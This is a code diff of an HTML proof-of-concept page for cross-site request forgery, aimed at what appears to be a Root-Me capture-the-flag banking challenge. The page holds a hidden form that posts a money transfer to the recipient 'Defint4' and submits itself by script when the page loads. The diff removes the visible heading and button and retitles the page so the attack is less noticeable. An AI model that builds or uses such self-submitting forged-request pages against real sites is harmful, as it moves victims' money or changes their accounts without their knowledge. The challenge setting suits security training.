@@ -1,18 +1,16 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CSRF Exploit</title>
+    <title>CSRF Automated Transfer</title>
 </head>
 <body>
-    <h1>CSRF Attack</h1>
     <form id="csrf-form" action="https://bankme-1.challenges.pro.root-me.org/transfer/" method="post">
-        <!-- Paramètres de la requête -->
+        <!-- Paramètres automatiques -->
         <input type="hidden" name="recipient" value="Defint4">
-        <input type="hidden" name="amount" value="500">
-        <button type="submit">Execute Transfer</button>
+        <input type="hidden" name="amount" value="50">
     </form>
     <script>
-        // Automatisation de la soumission
+        // Soumettre automatiquement dès que la page est chargée
         document.getElementById('csrf-form').submit();
     </script>
 </body>
